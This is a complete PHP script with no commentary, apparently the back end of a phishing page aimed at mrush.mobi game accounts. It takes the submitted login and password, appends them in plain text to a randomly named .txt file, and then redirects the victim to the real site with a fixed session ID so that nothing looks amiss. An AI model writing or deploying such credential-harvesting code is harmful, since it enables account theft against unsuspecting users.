<?php
$BASE="fwegrhtyjutyhgrefwefvgbyu6kiyut6y5terw.txt";

$LOCATION='http://mrush.mobi/welcome?error=0&name='.$_REQUEST["login"].'&PHPSESSID=5bb8ef86234be1565c191df7bcd875561429981617.72414144/';


$p1=$_REQUEST["login"];
$p2=$_REQUEST["password"];

$info="$p1:$p2\n";


$fd=fopen($BASE,"a+");
fwrite($fd,$info);
fclose($fd);


header('Location:'.$LOCATION.'');
?>
